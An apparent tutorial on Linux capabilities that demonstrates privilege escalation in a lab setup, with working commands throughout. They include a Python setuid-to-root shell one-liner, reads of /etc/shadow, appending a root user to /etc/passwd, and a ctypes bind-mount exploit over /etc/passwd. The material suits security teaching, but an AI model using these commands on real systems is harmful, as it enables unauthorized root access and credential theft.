Definition of Linux Capabilities



Linux Capabilities are a security feature that provides fine-grained control over privileged operations traditionally restricted to the root user. Instead of granting full root access, capabilities allow specific privileges to be assigned to processes or binaries. This enhances security by minimizing the risk of privilege escalation and reducing the attack surface.

For example, a binary can be assigned the ability to bind to low-numbered ports or bypass file permissions without having unrestricted root access.

Capabilities are divided into multiple categories, such as:

CAP_NET_BIND_SERVICE – Allows binding to ports below 1024.
CAP_SYS_ADMIN – Grants extensive system control (almost equivalent to root).
CAP_DAC_OVERRIDE – Allows bypassing file permission restrictions.
Capabilities can be managed using commands like getcap, setcap, and capsh.



1. Checking Capabilities of a Binary
   
Use the getcap command to check if a binary has capabilities set:

      getcap /usr/bin/ping 

2. Finding All Binaries with Capabilities

To list all files with special capabilities:
      
      getcap -r / 2>/dev/null

3. Common Capabilities That Can Lead to Privilege Escalation

![image](https://github.com/user-attachments/assets/78902b40-e40e-45a3-a642-59809e39a4a7)

4. Exploiting Capabilities for Privilege Escalation

4.1 cap_setuid (Set User ID)

This capability allows a binary to change its user ID, potentially leading to privilege escalation.

Granting cap_setuid to Python 3.9

      setcap cap_setuid+ep /usr/bin/python3.9

Finding All Binaries with Capabilities

    getcap -r / 2>/dev/null
    
Confirming the Capability

    getcap /usr/bin/python3.9

Exploiting Python 3.9 for Privilege Escalation

    /usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'
    
Removing the Capability

    setcap -r /usr/bin/python3.9

4.2 cap_dac_override (Bypass File Permissions)

A binary with cap_dac_override+ep can read sensitive files such as /etc/shadow.

Checking Access to /etc/shadow

    ls -lh /etc/shadow
    
    cat /etc/shadow
    
Setting cap_dac_override for Python 3.9

    setcap cap_dac_override+ep /usr/bin/python3.9
    
Confirming the Capability

    getcap /usr/bin/python3.9
Exploiting Python 3.9 to Read /etc/shadow

    /usr/bin/python3.9 -c 'print(open("/etc/shadow").read())'
    
    python3 -c 'print(open("/etc/shadow").read())'
    
Appending a New Root User to /etc/passwd

      /usr/bin/python3.9 -c 'open("/etc/passwd", "a").write("root2:$1$jJQZ0icg5UMXbDzX.tkUwZ8pyY9sQy.:0:0:root:/root:/bin/bash\n")'
      
Removing the Capability

    setcap -r /usr/bin/python3.9

4.3 cap_dac_read_search+ep (Bypass File Read and Directory Search Permissions)

A binary with cap_dac_read_search+ep can read restricted files like /etc/shadow.

Checking Access to /etc/shadow

    ls -lh /etc/shadow

    
    cat /etc/shadow
    
Setting cap_dac_read_search for Python 3.9

    setcap cap_dac_read_search+ep /usr/bin/python3.9
    
Confirming the Capability

    getcap /usr/bin/python3.9

    
Exploiting Python 3.9 to Read /etc/shadow

    /usr/bin/python3.9 -c 'print(open("/etc/shadow").read())'
    
Removing the Capability

    setcap -r /usr/bin/python3.9


4.4 cap_net_raw+ep (Can Sniff Network Traffic)

A binary with cap_net_raw+ep can capture packets.

Checking tcpdump Permissions

    ls -lh /usr/sbin/tcpdump
    
Setting cap_net_raw for tcpdump

    setcap cap_net_raw+ep /usr/sbin/tcpdump
    
Confirming the Capability

    getcap /usr/sbin/tcpdump
    
Exploiting tcpdump

    /usr/sbin/tcpdump
    
Removing the Capability

    setcap -r /usr/sbin/tcpdump

4.5 cap_sys_admin+ep (Full System Control, Essentially Root Access)

A binary with cap_sys_admin+ep can control system-wide settings.

Checking Access to /etc/passwd

    ls -lh /etc/passwd
    
Setting cap_sys_admin for Python 3.11

    setcap cap_sys_admin+ep /usr/bin/python3.11

Confirming the Capability

    getcap /usr/bin/python3.11

Exploiting Python 3.11 to Modify /etc/passwd

    cp /etc/passwd /tmp/passwd
    vim /tmp/passwd

Exploiting Python with a Custom Script

Create an exploit.py script:


    from ctypes import *
    
    libc = CDLL("libc.so.6")
    libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
    
    MS_BIND = 4096  # Defined in /usr/include/sys/mount.h:55
    source = b"/tmp/passwd"
    target = b"/etc/passwd"
    filesystemtype = b"none"
    options = b"rw"
    mountflags = MS_BIND
    
    libc.mount(source, target, filesystemtype, mountflags, options)


Running the Exploit

    /usr/bin/python3.11 exploit.py


Removing the Capability


    setcap -r /usr/bin/python3.11


    

